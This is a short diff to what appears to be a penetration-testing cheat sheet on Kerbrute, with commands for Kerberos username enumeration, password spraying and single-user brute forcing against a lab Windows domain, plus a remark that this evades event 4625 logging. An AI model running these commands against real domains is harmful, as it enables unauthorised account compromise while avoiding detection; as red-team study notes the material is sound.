@@ -14,9 +14,10 @@ Kerbrute has three main commands:
 
 
 Bruteforcing Windows passwords with Kerberos is much faster than any other approach and potentially stealthier since pre-authentication failures do not trigger that  "traditional" An account failed to log on event 4625. With Kerberos, you can validate  # a username or test a login by only sending one UDP frame to the KDC (Domain Controller) 
+
 ```bash
 # User enum (valid/invalid) 
-./kerbrute_linux_amd64 userenum -d lab.ropnop.com usernames.txt  
+./kerbrute_linux_amd64 userenum  -dc dc-domain -d lab.ropnop.com usernames.txt  
 # Password spraying 
 ./kerbrute_linux_amd64 passwordspray -d lab.ropnop.com domain_users.txt Password123  # Brute force one user (take care of policy!) 
 ./kerbrute_linux_amd64 bruteuser -d lab.ropnop.com passwords.lst thoffman  
